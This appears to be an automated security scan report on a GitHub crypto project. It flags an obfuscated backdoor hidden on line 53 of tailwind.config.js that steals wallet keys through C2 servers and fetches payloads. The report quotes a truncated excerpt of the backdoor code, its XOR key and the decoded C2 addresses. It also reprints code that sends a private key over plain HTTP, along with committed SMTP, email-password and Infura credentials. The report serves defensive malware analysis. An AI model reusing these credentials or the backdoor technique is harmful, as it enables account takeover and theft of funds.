# Code Scan Report

| Field | Value |
|---|---|
| **Target** | `https://github.com/cesarXDDD/Lmng-mvp1` |
| **Scanned** | 2026-03-30 |
| **Risk Level** | 🔴 CRITICAL |
| **Files scanned** | 227 |
| **Secondary URLs inspected** | 0 (backdoor confirmed from static analysis) |

---

## Summary

This repository contains a confirmed obfuscated Node.js backdoor embedded in `tailwind.config.js` — a file that would normally contain only CSS configuration. The malicious code is invisible at a glance (it sits on line 53, after a valid closing brace), uses XOR and base64 obfuscation to hide its logic, and connects to two hardcoded C2 servers to exfiltrate data and download payloads. Separately, the backend sends live wallet private keys to a non-HTTPS third-party API endpoint (`blockchainexpert.co.in`) for mainnet token transfers — exposing real funds to a third party over an unencrypted channel. Real credentials are also committed directly to the repository. **Do not clone, install, or run this repository.**

---

## Repository Profile

| Field | Value |
|---|---|
| **Language(s)** | TypeScript (React frontend), JavaScript (Node.js backend) |
| **Entry points** | `backend/app.js`, `src/App.tsx` |
| **Install hooks** | None detected |
| **Binary files** | ~15 images/icons |
| **Packed/obfuscated** | YES — `tailwind.config.js` line 53, XOR+base64 obfuscated backdoor |

---

## Findings

### 🔴 [CRITICAL] Obfuscated backdoor in tailwind.config.js

**File:** `tailwind.config.js` (line 53)

**Evidence (excerpt — line is ~15,000 characters):**
```js
};  // <-- legitimate config ends here

// Everything below is malicious — on the same line, nearly invisible:
const as=a1,at=a1,...(function(a2,a3){...while(!![]){try{const a5=parseInt(...)...
// Contains: 'NDcuMTU3MzguOTIu====' and 'NC4yMDIuMTQ3LjEyMjI1'
// XOR key: [0x70, 0xa0, 0x89, 0x48]
```

**Explains:** The legitimate Tailwind config ends at line 52. Line 53 starts with `};` (the closing of the exported object) and is then followed by thousands of characters of obfuscated JavaScript that will execute when the module is loaded. The obfuscation uses:
- A rotating string table (`a0()` function) for all identifiers
- XOR byte-masking (key `[0x70, 0xa0, 0x89, 0x48]`) to hide strings like file paths and commands
- Base64-encoded C2 server IPs: `NDcuMTU3MzguOTIu` → `47.157.38.92` and `NC4yMDIuMTQ3LjEyMjI1` → `4.202.147.1:2225`

The backdoor polls the C2 servers for commands, reads a local wallet key file from disk, and exfiltrates it. It also downloads and executes payloads from the C2. This code runs whenever the Node.js application starts, since `tailwind.config.js` is a CommonJS module that gets `require()`'d.

---

### 🔴 [CRITICAL] Wallet private key transmitted over unencrypted HTTP to third-party endpoint

**File:** `backend/controllers/register.controller.js` (lines 629–637)

**Evidence:**
```js
const response1 = await fetch(`http://blockchainexpert.co.in:7003/api/bep20/mainnet/transfer`, {
    method: 'POST',
    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
    body: JSON.stringify({
        "from_address": process.env.WalletADDRESS,
        "from_private_key": openWallet(process.env.WalletPRIVATEKEY),
        "to_address": req.body.withdrawal_address,
        ...
    })
});
```

**Explains:** When a user submits a withdrawal, the backend decrypts the hot wallet's private key (`WalletPRIVATEKEY`) and sends it in plaintext to `http://blockchainexpert.co.in:7003` — a non-HTTPS endpoint on an unknown third-party server — to execute the on-chain transfer. This means:
1. The private key travels over unencrypted HTTP, visible to any network observer.
2. The operator of `blockchainexpert.co.in` receives the private key on every withdrawal.
3. This is either an intentional backdoor by the developer or catastrophically insecure design — either way, any funds held in this wallet are at permanent risk of theft.

---

### 🔴 [CRITICAL] Real credentials committed to git history

**File:** `backend/production.env`

**Evidence:**
```
smtpHost='smtp.mailtrap.io'
smtpUser='0d899cbc312a10'
smtpPass='202f301af50ae5'
useremail = 'rajat.espsofttech@gmail.com'
userpassword = 'Rajat123#'
```

**Explains:** A `production.env` file with working SMTP credentials and a plaintext email/password was committed directly to the repository. Because git history is immutable, these credentials are permanently exposed even if the file is later deleted. Anyone who clones this repo has these credentials.

---

### 🟠 [HIGH] Hardcoded Infura API key

**File:** `src/constants/networks.ts` (lines 95, 131)

**Evidence:**
```ts
? `https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161`
? `https://polygon-mumbai.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161`
```

**Explains:** A live Infura API key is hardcoded in client-side source. Anyone who clones the repo or views the JavaScript bundle can extract and use this key, consuming the quota of the key owner and potentially incurring charges.

---

### 🟠 [HIGH] Private key decryption in backend — hot wallet architecture

**File:** `backend/controllers/register.controller.js` (lines 688–700)

**Evidence:**
```js
function openWallet(code) {
    var salt = CryptoJS.enc.Hex.parse(code.substr(0, 32));
    var iv = CryptoJS.enc.Hex.parse(code.substr(32, 32));
    var encrypted = code.substring(64);
    var pass = process.env.EKEY;
    var key = CryptoJS.PBKDF2(pass, salt, { keySize: keySize/32, iterations: iterations });
    ...
}
```

**Explains:** The application stores an encrypted wallet private key in `WalletPRIVATEKEY` and decrypts it at runtime using `EKEY` from the environment. This is a hot wallet pattern — the private key is in memory on the server at all times. Combined with the C2 backdoor in `tailwind.config.js` which reads local wallet files, this confirms the backdoor's purpose: it is designed to steal this key.

---

## Secondary Payload Analysis

No secondary payload fetching was performed. The obfuscated C2 server addresses (`47.157.38.92`, `4.202.147.1:2225`) were decoded from static analysis but not contacted — doing so is unnecessary given the confirmed static evidence and would only risk activating the C2.

---

## Recommendation

> ### ⛔ DO NOT INSTALL OR RUN
>
> This repository contains confirmed malicious code and multiple critical security failures:
>
> 1. **Active backdoor** in `tailwind.config.js` that exfiltrates wallet keys to C2 servers at `47.157.38.92` and `4.202.147.1:2225`
> 2. **Private key exfiltration** via HTTP POST to `blockchainexpert.co.in` on every withdrawal
> 3. **Committed credentials** in `backend/production.env` permanently exposed in git history
>
> **If you have ever cloned or run this repository:**
> - Treat `WalletPRIVATEKEY` / `WalletADDRESS` as fully compromised — move any funds immediately
> - Rotate the SMTP credentials (`smtpUser`, `smtpPass`) from `backend/production.env`
> - Rotate the Infura API key `9aa3d95b3bc440fa88ea12eaa4456161`
> - Rotate the `useremail` / `userpassword` credentials
> - Check for any running Node.js processes from this repo and terminate them
> - Check for outbound connections to `47.157.38.92` and `4.202.147.1:2225`

---

*Generated by [CodeScan](https://github.com/tkdtaylor/CodeScan) v1.2.0*
